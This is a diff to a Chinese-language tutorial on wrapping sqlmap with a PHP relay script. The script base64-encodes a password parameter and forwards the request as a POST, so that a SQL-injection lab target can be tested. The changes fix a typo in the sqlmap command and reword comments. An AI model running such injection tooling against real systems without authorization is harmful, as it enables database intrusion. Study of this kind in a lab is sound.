@@ -146,7 +146,7 @@ sqlmap -- GET获取传参 -- 加密 -- 组装请求体 --curl请求 --获取响�
 
 拓扑：
 
-10.10.70.10（攻击机）--10.10.70.109漏洞环境
+（sqlmap）-10.10.70.10（运行php脚本）--10.10.70.109漏洞环境
 
 步骤：
 
@@ -170,7 +170,7 @@ $param2 = $_GET['param2'];
 // 设置POST请求中的参数,需要注意传参的个数以及名称
 $sub = "Submit";
 $data = array(
-    'uname' => $param1,   //对应用户名的参数名
+    'uname' => $param1,   //uname参数名，$param1值
     'passwd' => $param2_base64,  //对应密码的参数名
     'submit' => $sub      //第三个参数，再数组外赋值后带入
 );
@@ -207,7 +207,7 @@ echo $response;
 sqlmap
 
 ```
-qlmap -u "http://10.10.70.6/php/test/sql_test.php?param1=test&param2=123456" -p param1
+sqlmap -u "http://10.10.70.6/php/test/sql_test.php?param1=test&param2=123456" -p param1
 ```
 
 测试截图
@@ -235,7 +235,7 @@ $param2_base64 = base64_encode($param2);
 // 设置POST请求中的参数,需要注意传参的个数以及名称
 $sub = "Submit";
 $data = array(
-    'uname' => $param1,   //对应用户名的参数名
+    'uname' => $param1,   //uname参数名，$param1值
     'passwd' => $param2_base64,  //对应密码的参数名
     'submit' => $sub      //第三个参数，再数组外赋值后带入
 );
